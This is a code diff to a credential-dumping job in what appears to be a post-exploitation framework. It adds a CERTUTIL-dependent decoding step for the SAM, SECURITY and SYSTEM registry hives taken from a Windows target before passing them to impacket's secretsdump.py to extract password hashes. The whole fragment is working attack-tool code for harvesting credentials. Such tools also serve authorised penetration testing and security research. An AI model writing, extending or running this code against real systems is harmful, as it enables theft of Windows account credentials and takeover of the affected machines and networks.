@@ -116,13 +116,31 @@ class HashDumpSAMJob(core.job.Job):
         path = "data/impacket/examples/secretsdump.py"
 
         self.sam_file = self.save_file(self.sam_data, "SAM", self.sam_encoder)
+        if self.options.get("CERTUTIL") == "true":
+            with open(self.sam_file, "rb") as f:
+                data = f.read()
+            data = self.decode_downloaded_data(data, "936")
+            with open(self.sam_file, "wb") as f:
+                f.write(data)
         self.print_status("decoded SAM hive (%s)" % self.sam_file)
 
         self.security_file = self.save_file(self.security_data, "SECURITY", self.security_encoder)
+        if self.options.get("CERTUTIL") == "true":
+            with open(self.security_file, "rb") as f:
+                data = f.read()
+            data = self.decode_downloaded_data(data, "936")
+            with open(self.security_file, "wb") as f:
+                f.write(data)
         self.print_status("decoded SECURITY hive (%s)" % self.security_file)
 
         if self.system_data:
             self.system_file = self.save_file(self.system_data, "SYSTEM", self.system_encoder)
+            if self.options.get("CERTUTIL") == "true":
+                with open(self.system_file, "rb") as f:
+                    data = f.read()
+                data = self.decode_downloaded_data(data, "936")
+                with open(self.system_file, "wb") as f:
+                    f.write(data)
             self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
             cmd = ['python2', path, '-sam', self.sam_file, '-system', self.system_file, '-security', self.security_file, 'LOCAL']
         else:
